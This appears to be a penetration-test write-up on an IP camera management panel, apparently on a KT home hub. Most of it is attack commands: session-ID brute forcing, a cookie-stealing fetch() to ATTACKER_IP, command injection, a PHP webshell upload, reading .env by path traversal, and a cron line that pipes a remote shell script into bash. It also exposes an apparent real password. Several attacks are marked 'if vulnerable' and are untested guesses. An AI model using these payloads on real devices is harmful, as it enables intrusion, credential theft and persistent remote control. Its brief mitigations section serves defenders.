# KT_GiGA_WiFi_Pen-test
Thought about KT publc Wifi or Home Hub

Exploiting Weak Authentication & Session Hijacking in an IP Camera System
Introduction
During a recent security assessment, I discovered an IP camera management system (http://172.30.1.254:8899) with multiple vulnerabilities, including weak authentication, CAPTCHA bypasses, and insecure session handling. This post details the flaws found and how they could be exploited for privilege escalation, cookie theft, and remote code execution (RCE).

1. Weak Authentication & CAPTCHA Bypass
Issue #1: Base64-Encoded Passwords
The system sends passwords in Base64 (not real encryption):

http
POST /login HTTP/1.1  
user_pwd=ZGV2anVzdGljZQo=  # Decodes to "devjustice"
Exploit:

bash```
echo "ZGV2anVzdGljZQo" | base64 --decode ```
Issue #2: Predictable CAPTCHA
The CAPTCHA (captcha_txt=chpfv) is static or easily guessable.
Bypass: Reuse the same CAPTCHA token:

bash
curl -X POST "http://172.30.1.254:8899/login" -d "captcha_txt=chpfv&user_id=admin&user_pwd=BASE64_PASS"
2. Session Hijacking & Cookie Theft
Issue #3: Insecure Session Tokens (sid)
The sid cookie lacks HttpOnly, making it stealable via XSS.

No clear time-based/database pattern, but sequential brute-forcing may work.

Bruteforce Attack:

bash
bash```
for i in {214000..215000}; do
  curl -s "http://172.30.1.254:8899/status/system_info" -H "Cookie: sid=$i" | grep -q "System Info" && echo "Valid SID: $i"
done```
XSS Cookie Stealing (If Vulnerable):

javascript
fetch('http://ATTACKER_IP/steal?cookie=' + document.cookie);



3. Privilege Escalation (RCE & Backdoors)
Issue #4: Command Injection in /status/system_info
If the endpoint executes system commands:

bash```
curl -X POST "http://172.30.1.254:8899/status/system_info" \
  -H "Cookie: sid=VALID_SID" \
  -d "cmd=;id"```
Issue #5: Arbitrary File Upload (If Available)
Upload a PHP webshell:

bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST -F "file=@shell.php" "http://172.30.1.254:8899/upload"
Then execute commands:
```
bash
curl "http://172.30.1.254:8899/uploads/shell.php?cmd=id"
```

4. Post-Exploitation & Data Exfiltration
Dump Credentials
```

curl -H "Cookie: sid=VALID_SID" "http://172.30.1.254:8899/../../.env"
Cronjob Persistence
```

bash

```
curl -X POST "http://172.30.1.254:8899/status/system_info" \
  -H "Cookie: sid=VALID_SID" \
  -d "cmd=echo '* * * * * curl http://ATTACKER_IP/shell.sh | bash' >> /var/spool/cron/root"
```


5. Mitigations & Lessons Learned
How to Fix These Issues?
✅ Use HTTPS (prevent sniffing).
✅ Replace Base64 with proper hashing (bcrypt, Argon2).
✅ Secure cookies (HttpOnly, Secure, SameSite=Strict).
✅ Rate-limit CAPTCHA attempts.
✅ Sanitize user input (block ;, |, $(cmd) in commands).


Final Thoughts
This system had multiple critical flaws that could lead to full compromise. While some attacks required authentication, session hijacking and RCE were possible due to weak design.

Key Takeaways:
🔴 Never trust client-side validation (Base64 ≠ encryption).
🔴 CAPTCHAs must be server-validated.
🔴 Session tokens must be unpredictable.

For ethical hackers, this serves as a reminder to test rigorously. For developers, it’s a lesson in secure design.
